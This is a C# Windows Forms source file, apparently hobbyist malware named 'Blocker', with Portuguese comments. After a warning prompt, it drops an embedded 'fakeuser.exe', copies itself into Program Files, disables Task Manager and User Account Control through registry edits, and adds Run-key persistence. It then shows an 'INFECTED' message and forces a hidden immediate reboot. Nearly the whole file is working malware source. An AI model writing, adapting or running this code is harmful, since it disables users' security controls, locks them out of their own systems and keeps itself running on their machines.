using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using Microsoft.Win32;
using System.Diagnostics;
using System.Reflection;

namespace Blocker
{
    public partial class malwareload : Form
    {
        public malwareload()
        {
            InitializeComponent();
        }

        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)

        {

            /*Credits by Cyber Soldier*/
            /*Créditos ao Cyber Soldier*/
            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        private async void malwareload_Load(object sender, EventArgs e)
        {
            /*aviso*/
            var escolha = DialogResult;
            var localvirus = @"c:\program files\temp";

            escolha = MessageBox.Show("ESSE APP É UM VIRUS E DESTRUIRÁ SEU SISTEMA. DESEJA EXECUTAR", "AVISO!", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);

            /*caso o usuário queira executar*/
            if (escolha == DialogResult.Yes)
            {
                
                Extract("Blocker", @"C:\Program Files\Temp", "Resources", "fakeuser.exe");
                Extract("Blocker", @"C:\Program Files\Temp", "Resources", "music.wav");
                File.Create(localvirus + @"\execute.msi");
                File.Copy(Application.ExecutablePath.ToString(), localvirus + @"\Blocker.exe");

                await Task.Run(() => Reg_corrupt());

                await Task.Delay(2000);
                MessageBox.Show("INFECTED HAHAHAHAH", "LOL", MessageBoxButtons.OK, MessageBoxIcon.Error);


            }
            /*caso queira fechar*/
            else
            {
                Environment.Exit(-1);
            }
        }

        public async void Reg_corrupt()
        {

            /*primeiras modificações no regedit*/

            /*block taskmgr*/

            RegistryKey tsmgr = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            tsmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);

            /*desabilitar o controle de usuário*/

            RegistryKey lua = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            lua.SetValue("EnableLUA", 0, RegistryValueKind.DWord);

            RegistryKey filter = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            filter.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);

            /*para inicializar com o sistema*/

            RegistryKey ini = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
            ini.SetValue(@"Blocker", @"C:\Program Files\temp\Blocker.exe");

            RegistryKey userinit = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
            userinit.SetValue("logon", @"c:\program files\temp\fakeuser.exe");
            


            /*forçar uma reinicialização*/

            await Task.Delay(10000);

            ProcessStartInfo desl = new ProcessStartInfo();
            desl.FileName = "cmd.exe";
            desl.Arguments = "/k shutdown /r /f /t 00";
            desl.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(desl);

        }
    }
}
